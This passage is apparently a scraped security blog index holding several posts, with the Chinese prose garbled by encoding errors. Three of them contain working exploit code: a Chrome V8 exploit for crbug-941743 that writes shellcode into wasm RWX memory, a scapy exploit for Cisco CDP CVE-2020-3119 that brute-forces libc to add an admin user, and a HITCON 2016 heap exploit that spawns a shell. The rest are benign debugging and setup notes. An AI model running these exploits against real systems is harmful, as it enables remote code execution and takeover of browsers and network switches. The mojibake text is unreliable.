can_use_type_feedback = false; }} æ‰€ä»¥åªè¦can_use_type_feedback = false; å³å¯ã€‚ 4. how to exploit?æ„é€ oobarrayï¼Œåˆ©ç”¨oobarrayå»ä¿®æ”¹åé¢arraybufferé•¿åº¦ç”¨æ¥ä»»æ„åœ°å€è¯»å†™ï¼Œåˆ©ç”¨oobarrayè¯»å†™leak_objå®ç°addrofå’ŒfakeobjåŸè¯­ã€‚s 5. exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211/* exploit for crbug-941743*/is_in_v8_flag = true;// =================================================================// tookit// =================================================================var g_buffer = new ArrayBuffer(16);var g_float64 = new Float64Array(g_buffer);var g_uint64 = new BigUint64Array(g_buffer);function float2address(f) { g_float64[0] = f; return g_uint64[0];}function address2float(addr) { let i = BigInt(addr); g_uint64[0] = i; return g_float64[0];}function hex(i) { return '0x' + i.toString(16).padStart('0');}function info(msg) { console.log('[+] ' + msg);}function error(msg) { console.log('[-] ' + msg); exit(1);}function gc() { for (let i = 0; i &lt; 100; i++) { new ArrayBuffer(0x100000); }}function myprint(msg){ if(is_in_v8_flag){ print(msg); }else{ console.log(msg); }}// =================================================================// exploit part// =================================================================var max_iters = 10000;var max_search = 0x10000;Array(32760);// This call ensures that TurboFan won't inline array constructors.Array(2**30);// Set up a fast holey smi array, and generate optimized code.let a = [1, 2, ,,, 3];let oob_array;let leak_obj;let rw_arraybuffer;let obj = {}; //using for leak_objlet oob_array_length_offset = 23; // get this by debugginglet oob_array_storage_length_offset = oob_array_length_offset - 6;function inline(){ return a.map( (value, index) =&gt;{ if (index == 0){ oob_array = [1.1, 2.2]; leak_obj = {m:address2float(0xdeadbeef), n:obj}; rw_arraybuffer = new ArrayBuffer(0x4321); } if (index == oob_array_length_offset +1 ){ throw &quot;oob finished...&quot; } return index; });}inline();for(var i = 0; i &lt; max_iters; ++i) inline();// Now lengthen the array, but ensure that it points to a non-dictionary// backing store.a.length = (32 * 1024 * 1024)-1;a.fill(1, oob_array_storage_length_offset, oob_array_storage_length_offset + 1);a.fill(1, oob_array_length_offset);a.length += 500;leak_obj_offset = 0;rw_arraybuffer_offset = 0;function addrOf(obj){ leak_obj.n = obj; return Number(float2address(oob_array[leak_obj_offset]));}function fakeObj(obj_address){ oob_array[leak_obj_offset] = Number(float2address(obj_address)); return leak_obj.n;}function read64(addr){ oob_array[rw_arraybuffer_offset] = address2float(addr); let data_view = new DataView(rw_arraybuffer); return Number(float2address(data_view.getFloat64(0, true)));}// function write64(addr, value){// oob_array[rw_arraybuffer_offset] = address2float(addr);// let data_view = new DataView(rw_arraybuffer);// data_view.setFloat64(0, float2address(value), true);// }function write32(addr, value){ oob_array[rw_arraybuffer_offset] = address2float(addr); let data_view = new DataView(rw_arraybuffer); data_view.setInt32(0, value, true);}var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0,1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2,0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 10, 11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule, {});var func = wasmInstance.exports.main;try{ inline();}catch(e){ if(oob_array.length &gt; 2){ myprint(&quot;[+] oob successed!&quot;); myprint(&quot;[+] oob_array length is : &quot; + oob_array.length); }else{ throw &quot;oob Failed&quot; } for(var i = 0; i &lt; max_search; ++i){ var value = float2address(oob_array[i]); if(value == 0xdeadbeef){ leak_obj_offset = i + 1; break; } } for(var i = 0; i &lt; max_search; ++i){ var value = float2address(oob_array[i]); if(value == 0x4321){ rw_arraybuffer_offset = i + 1; break; } } if(leak_obj_offset == 0 || rw_arraybuffer_offset==0) throw &quot;get offset failed&quot; myprint(&quot;[+] leak_obj_offset : &quot; + leak_obj_offset); myprint(&quot;[+] rw_arraybuffer_offset : &quot; + rw_arraybuffer_offset); var wasm_func_addr = addrOf(func) - 1; myprint(&quot;[+] wasm func addr : &quot; + hex(wasm_func_addr)); var shared_info = read64(wasm_func_addr + 0x18) - 1; myprint(&quot;[+] wasm shared info : &quot; + hex(shared_info)); var data_address = read64(shared_info + 0x8) - 1; myprint(&quot;[+] data_address : &quot; + hex(data_address)); var instance_address = read64(data_address + 0x10) - 1; myprint(&quot;[+] instance_address : &quot; + hex(instance_address)); var rwx_address = read64(instance_address + 0x108); myprint(&quot;[+] rwx_address : &quot; + hex(rwx_address)); // %DebugPrint(func); // %SystemBreak(); write32(rwx_address, 0x99583b6a); write32(rwx_address + 0x4, 0x2fbb4852); write32(rwx_address + 0x8, 0x6e69622f); write32(rwx_address + 0xc, 0x5368732f); write32(rwx_address + 0x10, 0x57525f54); write32(rwx_address + 0x14, 0x050f5e54); // %SystemBreak(); // let's go to the shellcode func();} 6. referencecrbug-941743","link":"/2020/06/20/Chrome-M73-issue-941743/"},{"title":"Cisco CDP cve-2020-3119","text":"é…ç½®ä½¿ç”¨GNS3å¯ä»¥å¤ç°æ¼æ´ï¼›ä½¿ç”¨EVEä¹Ÿå¯ä»¥ï¼Œä¸€ä¸ªå®šåˆ¶åŒ–çš„Linuxï¼Œæä¾›ä¸€ä¸ªä»¿çœŸç¯å¢ƒï¼Œæˆ‘å½“æ—¶ä¸¤ä¸ªæ–¹æ³•éƒ½æµ‹è¯•äº†,GNS3æœ‰ç‚¹å°å‘ï¼Œæœ€ååœ¨EVEä¸Šæµ‹è¯•é€šè¿‡çš„ã€‚ é…ç½®çš„æµç¨‹å…¶å®éƒ½ä¸€æ ·ï¼Œè¿›å…¥consoleå¯åŠ¨äº¤æ¢æœºã€‚ 12dirboot nxos.9.3.2.bin è®¾ç½®å¯†ç  Root1234 é…ç½®nexusäº¤æ¢æœºã€‚å‚è€ƒè¿™é‡Œ 12345678910111213141516switch# conf tEnter configuration commands, one per line. End with CNTL/Z.switch(config)# interface mgmt0switch(config-if)# ip address 10.0.2.15/24 &lt;--- NOTE: can use &quot;ip address dhcp&quot; here insteadswitch(config-if)in# no shutswitch(config-if)# endswitch# conf tEnter configuration commands, one per line. End with CNTL/Z.switch(config)# username vagrant password vagrant role network-adminswitch(config)# username vagrant shell bashswitch(config)# boot nxos bootflash:nxos.7.0.3.I2.2d.bin &lt;--- Note: use correct image name from &quot;dir&quot; command outputswitch(config)# copy r s[########################################] 100%Copy complete.switch(config)# é€†å‘ç›´æ¥åæ±‡ç¼–binæœ‰å‘ï¼Œéœ€è¦gdbdumpäº†çœ‹dumpã€‚ æ¼æ´ 1*(&amp;a1-&gt;levels + counter) = *(&amp;ptr + counter);// write what where è¿™é‡Œå¯ä»¥ä»»æ„åœ°å€å†™ã€‚ åˆ©ç”¨123456Arch: i386-32-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: PIE enabledRPATH: b'/isan/lib/convert:/isan/lib:/isanboot/lib' 1ret_addr + JUNK + arg1 çŒœä¸¤ä¸ªåœ°å€ï¼Œstack baseå’Œ libc baseï¼Œ ä»¥åŠheap addressï¼Ÿ å­˜åœ¨æ ˆä¸Šçš„å †åœ°å€æ€ä¹ˆç”¨å‘¢ï¼Ÿretè¿‡å»ï¼Ÿ 123456789101112payload = [struct.pack('&lt;I', 0x0),'A' * 64,struct.pack('!h', 0xdeadbeef), # saved ebpstruct.pack('!h', libc_base + pop_ret_offset), # ret addrstruct.pack('!h', libc_base + libc_bss_offset), # a1struct.pack('!h', libc_base + pop_ret_offset),struct.pack('!h', 0xdeadbeef),...struct.pack('!h', libc_base + system_offset),struct.pack('!h', 0xdeadbeef),] åªéœ€è¦çŒœsystemæ‰€åœ¨libcçš„åŸºåœ°å€ã€‚ 1234567891011121314junksaved ebpret addr; // pop retå³å¯a1pop retjunkpop retjunk...pop retjunksystem_addrxxxxcmd_str_addr a1åªè¦æ˜¯ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„æŒ‡å‘dataæ®µçš„æŒ‡é’ˆå³å¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from scapy.contrib import cdpfrom scapy.all import Ether, LLC, SNAP, sendpfrom time import sleepimport structoffset_to_cmd = 40 # TODOlibc_bss_offset = 0x001B4EE0 + 0x200 # use for a1system_offset = 0x0003C790 # system funcpr_offset = 0x00021b07 # pop eax; ret# pppr_offset_offset = 0x000df5d2 # pop ebp ; pop edi ; pop ebx ; retppr_offset_offset = 0x000f5e5a # pop ebp ; pop ebx ; retcmd = '/isan/bin/vsh -c &quot;configure terminal ; username test password qweASD123 role network-admin&quot;'def gen(libc_base): payload = &quot;&quot; payload += struct.pack('&gt;I', 0x0) + 'A' * 64 payload += struct.pack('&gt;I', 0x00001337) + struct.pack('&gt;I', libc_base + pr_offset) # saved ebp + ret addr payload += struct.pack('&gt;I', libc_base + libc_bss_offset) # a1 if offset_to_cmd % 2 == 1: payload += (struct.pack('&gt;I', libc_base + pr_offset) + struct.pack('&gt;I', 0x00001337)) * offset_to_cmd else: payload += struct.pack('&gt;I', libc_base + ppr_offset_offset) + struct.pack('&gt;I', 0x00001337) * 2 payload += (struct.pack('&gt;I', libc_base + pr_offset) + struct.pack('&gt;I', 0x00001337)) * (offset_to_cmd - 3) payload += struct.pack('&gt;I', libc_base + system_offset) + struct.pack('&gt;I', 0x00001337) return payloaddef exploit(payload): # link layer l2_packet = Ether(dst=&quot;01:00:0c:cc:cc:cc&quot;) # Logical-Link Control l2_packet /= LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP() # Cisco Discovery Protocol cdp_v2 = cdp.CDPv2_HDR(vers=2, ttl=180) deviceid = cdp.CDPMsgDeviceID(val=cmd) portid = cdp.CDPMsgPortID(iface=b&quot;ens38&quot;) address = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr=&quot;192.168.204.77&quot;)) cap = cdp.CDPMsgCapabilities(cap=1) power_req = cdp.CDPMsgUnknown19(val=payload) power_level = cdp.CDPMsgPower(power=16) cdp_packet = cdp_v2/deviceid/portid/address/cap/power_req/power_level packet = l2_packet / cdp_packet sendp(packet)def main(): assert offset_to_cmd !=0 for libc_base in range(0xf5000000, 0xf5fff000, 0x1000): try: print('[*] Exploiting...guess libc on {0}'.format(hex(libc_base))) payload = gen(libc_base) exploit(payload) except Exception as e: print(e) sleep(5)def test(): payload = gen(0xf5dd9000) exploit(payload)if __name__ == '__main__': # main() test() referenceCVE-2020-3119 Cisco CDP åè®®æ ˆæº¢å‡ºæ¼æ´åˆ†æs","link":"/2020/04/23/Cisco-CDP-cve-2020-3119/"},{"title":"HITCON-2016-Quals-SecretHolder","text":"0x00:å‰å‡ å¤©hitcon2016å¼€å•¦ï¼Œå°±æƒ³ç€å»çœ‹çœ‹é¢˜ï¼Œå­¦ä¹ ä¸‹ï¼Œpwn100çš„è¿™ä¸ªSecretHolderæ˜¯ä¸ªdouble freeçš„æ´ï¼Œä½†æ˜¯å½“æ—¶å¹¶ä¸çŸ¥é“æ€ä¹ˆå»æï¼Œä»Šå¤©åˆšä»Icemakrå¸ˆå‚…é‚£é‡Œå­¦åˆ°äº†æ€è·¯ï¼Œæ‰€ä»¥å°±è®°å½•ä¸€ä¸‹ã€‚ 0x01: ç¨‹åºåˆ†æç¨‹åºå¾ˆå®¹æ˜“åˆ†æ 1234567891011121314151617181920212223242526272829303132void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ int choice; // eax@2 char s; // [sp+10h] [bp-10h]@2 __int64 v5; // [sp+18h] [bp-8h]@1 v5 = *MK_FP(__FS__, 40LL); sub_400C80(a1, a2, a3); puts(\"Hey! Do you have any secret?\"); puts(\"I can help you to hold your secrets, and no one will be able to see it :)\"); while ( 1 ) { puts(\"1. Keep secret\"); puts(\"2. Wipe secret\"); puts(\"3. Renew secret\"); memset(&amp;s, 0, 4uLL); read(0, &amp;s, 4uLL); choice = atoi(&amp;s); switch ( choice ) { case 2: wipe_secret(); break; case 3: renew_secret(); break; case 1: keep_secret(); break; } }} æ–°å»ºå—çš„æ—¶å€™ 123456789101112131415161718192021222324252627if ( size_of_secret == 2 ) // big{ if ( !flag_big ) { big_buffer = calloc(1uLL, 4000uLL); flag_big = 1; puts(\"Tell me your secret: \"); read(0, big_buffer, 4000uLL); }}else if ( size_of_secret == 3 ) // huge{ if ( !flag_huge ) { huge_buffer = calloc(1uLL, 400000uLL); flag_huge = 1; puts(\"Tell me your secret: \"); read(0, huge_buffer, 400000uLL); }}else if ( size_of_secret == 1 &amp;&amp; !flag_small )// samll{ small_buf = calloc(1uLL, 40uLL); flag_small = 1; puts(\"Tell me your secret: \"); read(0, small_buf, 40uLL);} é‡Šæ”¾å—çš„æ—¶å€™ 123456789101112131415switch ( wipe_choice ) { case 2: free(big_buffer); flag_big = 0; break; case 3: free(huge_buffer); flag_huge = 0; break; case 1: free(small_buf); flag_small = 0; break; } åœ¨.bssæ®µä¸Šæœ‰æ ‡å¿—ä½ï¼Œæ ‡å¿—ç€å½“å‰è¿™ç§å—æœ‰æ²¡æœ‰è¢«ä½¿ç”¨ã€‚ é—®é¢˜æ˜¯ï¼Œæ¯ç§å—åªèƒ½å»ºä¸€æ¬¡ï¼Œè€Œä¸” huge bufferæ˜¯mmapå‡ºæ¥çš„ï¼Œæˆ‘ä»¥ä¸ºå°±æ²¡å•¥ç”¨äº†â€¦ä»Šå¤©çœ‹äº†å¸ˆå‚…çš„åšå®¢æ‰çŸ¥é“ å®é™…ä¸Šï¼Œå…ˆåˆ›å»ºhuge noteï¼Œå†free huge noteä¹‹åï¼Œå†æ¬¡åˆ›å»ºhuge noteæ—¶ï¼Œmallocå°±ä¼šç”¨sbrkæ¥åˆ†é…å†…å­˜äº†ï¼Œä¹‹åå°±æ˜¯å¸¸è§„çš„double freeäº†ã€‚ æ€è·¯getï¼Œå°±å¯ä»¥æ¥ç€æäº†ã€‚ 0x02:åˆ†é…hugeï¼Œé‡Šæ”¾hugeï¼Œç„¶ååˆ†é…smallï¼Œbigï¼Œç„¶åé‡Šæ”¾smallï¼Œbigï¼Œå†åˆ†é…hugeæ—¶ï¼Œåˆ†é…çš„hugeå†…å­˜åˆ†é…å°±å¦‚å›¾æ‰€ç¤ºäº†ã€‚å¯ä»¥æ ¹æ®è¿™ä¸ªä¼ªé€ å †å—ï¼Œç„¶åå»free(big_chunk)ï¼Œä¹‹åå°±å¯ä»¥å¾—åˆ°.bssä¸Šä¸€ä¸ªåœ°å€å•¦ï¼Œæ¥ç€å°±å¯ä»¥å»åšleakï¼Œä¿®æ”¹gotçš„äº‹æƒ…äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697 from zio import * from time import sleep #target = './SecretHolder' target = ('127.0.0.1',10001) io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green')) big_note_addr = 0x6020a0 huge_note_addr = 0x6020a8 small_note_addr = 0x6020b0 got_atoi_addr = 0x602070 got_free_addr = 0x602018 plt_puts_addr = 0x4006c0 #ubuntu 16.04 offset_system_atoi = 0xe510 def Keep_secret(size,content): io.read_until('3. Renew secret') io.writeline('1') io.read_until('3. Huge secret') io.writeline(str(size)) io.read_until('Tell me your secret:') io.writeline(str(content)) def Wipe_secret(size): io.read_until('3. Renew secret') io.writeline('2') io.read_until('3. Huge secret') io.writeline(str(size))def Renew_secret(size,new_content): io.read_until('3. Renew secret') io.writeline('3') io.read_until('3. Huge secret') io.writeline(str(size)) io.read_until('Tell me your secret:') io.writeline(str(new_content)) #small = 1 #big = 2 #huge = 3 #malloc huge and free it. Keep_secret(3,\"C\"*0x100) Wipe_secret(3) #malloc small chunk and big chunk. Keep_secret(1,\"A\"*0x20) Keep_secret(2,\"B\"*0x80) #free small and big chunk. Wipe_secret(1) Wipe_secret(2) payload = l64(0x0) + l64(0x30) + l64(huge_note_addr - 0x8 * 3) + l64(huge_note_addr - 0x8 * 2) # chunk 1 (free'd) payload += l64(0x20) + l64(0xa0) payload += 'A' * 0x90 # chunk 2 payload += l64(0x0) + l64(0xa1) payload += 'A' * 0x90 # chunk 3 payload += l64(0x0) + l64(0xa1) #raw_input('0x000000000040086D') Keep_secret(3,payload) #free big chunk --&gt; unlink bug here. #raw_input('0x0000000000400A27') Wipe_secret(2) #overwrite ptrs on .bss payload_leak = \"A\"*0x10 payload_leak += l64(got_atoi_addr) + l64(got_free_addr) + l64(got_atoi_addr) payload_leak += l32(0x1)*3 #raw_input('0x0000000000400B1E') Renew_secret(3,payload_leak) #overwrite free@got to make info leak. payload_overwrite = l64(plt_puts_addr) + l64(plt_puts_addr+0x6) #leak #raw_input('0x0000000000400B1E') Renew_secret(3,payload_overwrite) Wipe_secret(2) tmp = io.read(8)[1:][::-1][1:][::-1] leak_atoi_addr = l64(tmp.ljust(8,'\\x00')) print \"system addr : 0x%x\" % leak_atoi_addr system_addr = leak_atoi_addr + offset_system_atoi print \"system addr : 0x%x\" % system_addr raw_input('0x0000000000400B1E') Renew_secret(1,l64(system_addr)) io.write('/bin/sh\\0') io.interact() ä¸çŸ¥é“ä¸ºå•¥io.gdb_hint()æ²¡æ–­ä¸‹æ¥ï¼Œæ‰€ä»¥æˆ‘æ‰“æ–­ç‚¹éƒ½æ˜¯ç”¨raw_input()ç„¶åattachè¿›å»æçš„ï¼Œæ‰€ä»¥expçœ‹èµ·æ¥è´¼ä¹±â€¦ 0x03:å‚è€ƒ Icemakrå¸ˆå‚…çš„æ–‡ç« ","link":"/2016/10/11/HITCON-2016-Quals-SecretHolder/"},{"title":"Final","text":"éšç¬” ä»Šå¤©ç»ˆäºåŠå®Œäº†æ ¡èµ›çš„å†³èµ›ï¼Œç¬¬äºŒæ¬¡å‚ä¸å‡ºé¢˜ã€è¿ç»´å·¥ä½œã€‚ å»å¹´æ˜¯å­¦é•¿ä¸»åŠ›åšè¿ç»´å·¥ä½œï¼Œä»Šå¹´åˆ°äº†è‡ªå·±ï¼ŒçœŸçš„æ˜¯æŒºéš¾çš„ã€‚ åœ¨è¿™æ¬¡è§„æ¨¡è¾ƒå¤§çš„æƒ…å†µä¸‹(20æ”¯é˜Ÿä¼)ï¼Œæ€ä¹ˆé…ç½®pwnç›¸å…³çš„æƒé™ï¼Œé›†ä¸­ç®¡ç†pwnæœåŠ¡ï¼Œæ€ä¹ˆåšcheckâ€¦çœŸçš„æ˜¯åšçš„æ—¶å€™æ‰å‘ç°å‘æœ‰å¤šå°‘ã€‚è¿ç»´è„šæœ¬ä»æœ¬æ¥ä»¥ä¸ºçš„100å¤šè¡Œå†™é“å¿«500è¡Œï¼ŒåŠŸèƒ½åŸºæœ¬å®Œå¤‡ï¼Œè¿˜æœ‰å¾…æ”¹å–„å§ã€‚ æœ€åï¼Œå¤§ä¸‰è¦ç»“æŸäº†ï¼Œå®Œæˆäº†ç®—æ˜¯å¤§ä¸‰æœ€åçš„ä¸€ä¸ªä»»åŠ¡ - ã€‚- è¿˜ç®—ä¸é”™ï¼Œå°ä¼™ä¼´ä»¬éƒ½è¾›è‹¦äº†ã€‚ä¿®ä»™ä¿®çš„äººéƒ½ä¸å¥½äº†","link":"/2017/06/19/Final/"},{"title":"Debug macOS Kernel","text":"0x00 : ç¯å¢ƒé…ç½®åŸºæœ¬åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œè™šæ‹Ÿæœºè°ƒè¯•æˆ–è€…åŒæœºè°ƒè¯•ã€‚ è™šæ‹Ÿæœº ï¼š vmfusion,`` KDK` åŒæœº: ç«çº¿ã€‚ æˆ‘è¿™é‡Œç”¨çš„æ˜¯``mbp2017è°ƒmbp2015ï¼Œå€Ÿäº†åŒäº‹çš„çº¿ï¼Œè¿æ¥ä¸ºï¼šmbp2017-typec-é›·ç”µ2-ç«çº¿-é›·ç”µ2-mbp2015`ã€‚ 0x01 : è™šæ‹Ÿæœºä¸‹é¢æ˜¯æ ‡å‡†æ­¥éª¤ vm å…³é—­SIPï¼Œå¹¶ä¸”æŠŠæƒ³è¦åŠ è½½çš„å†…æ ¸æ‹·è´åˆ° å†…æ ¸çš„ç›®å½• sudo cp /Library/Developer/KDKs/KDK_YOUR_VERSION/System/Library/Kernels/kernel.development /System/Library/Kernels å®‰è£…å½“å‰ç‰ˆæœ¬ç³»ç»Ÿçš„KDKï¼Œ[Apple Develop KDK download](https://developer.apple.com/download/more/?q=Kernel Debug Kit) è®¾ç½®å¯åŠ¨å‚æ•° sudo nvram boot-args=&quot;debug=0x14e kext-dev-mode=1 kcsuffix=development pmuflags=1 -v&quot; æ¸…ç†ç¼“å­˜ sudo kextcache -invalidate / è®°ä½å½“å‰vmçš„ipï¼Œç„¶åé‡å¯ sudo reboot è¿™é‡ŒæŠŠdevelopmentç‰ˆæœ¬çš„å†…æ ¸æ‹·è´åˆ°System/Library/Kernelsé‡Œï¼ŒæŒ‡å®šå¯åŠ¨æ—¶åŠ è½½developmentç‰ˆæœ¬çš„å†…æ ¸ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åŠ è½½kasanç‰ˆæœ¬çš„ï¼Œçœ‹éœ€æ±‚ã€‚ host å®‰è£…è¢«è°ƒè¯•æœºå™¨çš„KDK è¿™ç§æƒ…å†µæ˜¯é ç½‘ç»œè°ƒè¯•ã€‚ ä½†æ˜¯æ ¹æ®ä¹‹å‰çš„å¯åŠ¨å‚æ•°ï¼Œå¼€æœºæ—¶æ–­ä¸ä¸‹æ¥çš„ï¼Œå½“ç„¶å¯ä»¥è®¾ç½®ä¸€ä¸ª0x1æ¥è®©ä»–å¯åŠ¨æ—¶æ–­ä¸‹æ¥ç­‰è°ƒè¯•å™¨ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸ªä¸å¥½ä½¿(å¯èƒ½æˆ‘ç¯å¢ƒæœ‰é—®é¢˜)ã€‚ å¦‚æœæŒ‰ç…§ä¸Šé¢çš„è®¾ç½®0x14e ï¼Œé‚£ä¹ˆéœ€è¦åœ¨è™šæ‹Ÿæœºä¸­æŒ‰ä¸‹ cmd + opt + ctrl + shitf+ escè§¦å‘ä¸­æ–­ï¼Œ éšålldbä¸­ : 12$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development(lldb)kdp-remote you_vm_ip ä¹‹åå°±å¯ä»¥è°ƒè¯•äº†ã€‚ 0x02 : åŒæœºè°ƒè¯•ä¸‹é¢æ˜¯æ ‡å‡†æ­¥éª¤ è¢«è°ƒè¯•æœº å…³SIPï¼Œæ‹·è´KDKé‡Œçš„å†…æ ¸åˆ°/System/Library/Kernels å®‰è£…å½“å‰ç³»ç»Ÿç‰ˆæœ¬çš„KDK è®¾ç½®å¯åŠ¨å‚æ•° sudo nvram boot-args=&quot;debug=0x14e kdp_match_name=firewire fwkdp=0x8000 kcsuffix=development&quot; æ¸…ç†ç¼“å­˜ sudo kextcache -invalidate / é‡å¯ sudo reboot è¿™é‡Œå¿…é¡»è¯´ä¸€ä¸‹ï¼Œç«çº¿çš„åç§°ï¼Œifconfigé‡Œçœ‹åˆ°çš„ï¼Œé»˜è®¤æ˜¯fw0ï¼Œä½†æ˜¯è¿™ä¸ªå¯åŠ¨å‚æ•°é‡Œå¿…é¡»æ˜¯firewireï¼Œ å¿…é¡»æ˜¯firewireï¼Œå¿…é¡»æ˜¯firewireï¼ è¿™ä¸ªåœ°æ–¹å‘äº†æˆ‘æŒºä¹…ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºç”¨ifconfigé‡Œçœ‹åˆ°çš„é‚£ä¸ªåå­— :-( è°ƒè¯•æœº å®‰è£…è¢«è°ƒè¯•æœºå™¨çš„KDK LLDBåŠ è½½ç›®æ ‡å†…æ ¸ 12$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development(lldb) å¯åŠ¨fwkdp fwkdp -v è¢«è°ƒè¯•æœºæŒ‰ä¸‹cmd+opt+ctrl+shift+escè§¦å‘ä¸­æ–­ lldb é‡Œè¿æ¥ (lldb) kdp-remote localhost æ„Ÿè§‰è¿‡ç¨‹å°±æ˜¯fwkdpåšäº†è½¬å‘çš„å·¥ä½œï¼Œæ‰€ä»¥lldbç›´æ¥kdp-remoteå°±å¯ä»¥äº†ã€‚ 0x03 : KDKæ˜¯å¿…é¡»çš„å—ï¼Ÿå¹¶ä¸æ˜¯ï¼Œkdkåªæ˜¯ç»™ä½ æ›´å¤šçš„å†…æ ¸ä¸­çš„ç¬¦å·ï¼Œæ‰€ä»¥ä¸ç”¨kdkä¹Ÿæ²¡äº‹ï¼Œå°±ç­‰äºç›´æ¥è°ƒè¯•æ­£å¼ç‰ˆçš„å†…æ ¸ï¼Œå°‘äº†å†…æ ¸ç¬¦å·è€Œå·²ï¼Œäººè‚‰å¯¹æ¯”ç€è¿‘æœŸç‰ˆæœ¬çš„æºç å…¶å®å½±å“æ²¡é‚£ä¹ˆå¤§ã€‚","link":"/2019/10/17/Debug-macOS-Kernel/"},{"title":"Hello PANDA","text":"0. EnvironmentUbuntu16.04 x64 1. Install Panda123git clone https://github.com/moyix/panda.gitcd panda./panda_install.bash 2. Working Folder and HDD123$ mkdir my_first_panda$ cd my_first_panda$ ../qemu/qemu-img create -f qcow2 test.img 32G 3. Boot VM1../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024 you will get: 123456âœ my_first_panda git:(master) âœ— ../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024(process:21836): GLib-WARNING **: /build/glib2.0-7ZsPUq/glib2.0-2.48.2/./glib/gmem.c:483: custom memory allocation vtable not supportedQEMU 1.0,1 monitor - type 'help' for more information(qemu) change ide1-cd0 win_server_2008_r2.iso (qemu) mount your iso file: 12(qemu) change ide1-cd0 win_server_2008_r2.iso (qemu) 4. Install OSConnect your vm with a VNC client, press ctrl + opt + del(on macOS) / ctrl + alt + del(on Windows) to reboot your vm,then you are able to install the OS. 5. Record/Replay with PANDA1(qemu) begin_record test â€¦. 1(qemu) end_record now you can replay (with replay movie plugin) 1../qemu/x86_64-softmmu/qemu-system-x86_64 -replay test -panda replaymovie -m 2048 other plugins? Taint?cov? :) 6. ReferenceMy first panda Panda Usage","link":"/2018/11/08/Hello-PANDA/"},{"title":"Have fun with Blind ROP","text":"0x00: å…³äºBROPç¬¬ä¸€æ¬¡é‡åˆ°BROPæ˜¯åœ¨HCTF 2016ï¼Œå½“æ—¶å¹¶æ²¡æœ‰æå®šè¿™ä¸ªä¸œè¥¿ï¼Œå‰ä¸€æ®µæ—¶é—´èŠ±äº†ç‚¹æ—¶é—´ç ”ç©¶äº†ä¸‹è¿™ç§åˆ©ç”¨æ–¹å¼ï¼Œæå®šäº†é‚£ä¸ªé¢˜ç›®ï¼Œé¡ºä¾¿ä¹Ÿçœ‹äº†ä¸‹å…³äºBROPçš„è®ºæ–‡å’Œslideï¼Œå®è·µäº†ä¸‹ä½¿ç”¨BROPæŠ€æœ¯æä½ç‰ˆæœ¬çš„ngnixã€‚ 0x01: å…ˆè¯´CTFä¸­é‡åˆ°çš„æ¯”èµ›ç»“æŸåï¼Œæ­ç”µçš„å¸ˆå‚…ä»¬æŠŠé¢˜ç›®éƒ½å¼€æºä¸¢githubäº†ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æ‹¿æ¥æºç è‡ªå·±ç¼–è¯‘è‡ªå·±æäº†ï¼Œæºç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;int i;int check();int main(void){ setbuf(stdin,NULL); setbuf(stdout,NULL); setbuf(stderr,NULL); for(;;){ puts(&quot;WelCome my friend,Do you know password?&quot;); if(!check()){ puts(&quot;Do not dump my memory&quot;); }else { puts(&quot;No password, no game&quot;); } } return 0;}int check(){ char buf[50]; read(STDIN_FILENO,buf,1024); return strcmp(buf,&quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;);} æ¯”èµ›çš„æ—¶å€™è¿™ä¸ªé¢˜ç›®åªç»™äº†ipå’Œç«¯å£ï¼Œå…¶ä»–ä¿¡æ¯å°±æ²¡æœ‰äº†ï¼Œåé¢ç»™å‡ºäº†bofçš„bufferå¤§å°ä½œä¸ºæç¤ºã€‚é‚£ä¹ˆæ ¹æ®è¿™ä¸ªå¤§å°å¯ä»¥è®¡ç®—å‡ºpayloadçš„ç»“æ„ï¼Œæ‰€ä»¥å°±å¯ä»¥ä½¿ç”¨BROPçš„æ€è·¯å»ä¸€æ­¥ä¸€æ­¥æå®šè¿™ä¸ªé¢˜ç›®äº†ã€‚ 0x02ï¼šè¿‡ç¨‹1. æ‰¾åˆ°hang addré¦–å…ˆè¦æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªè¦†ç›–ret 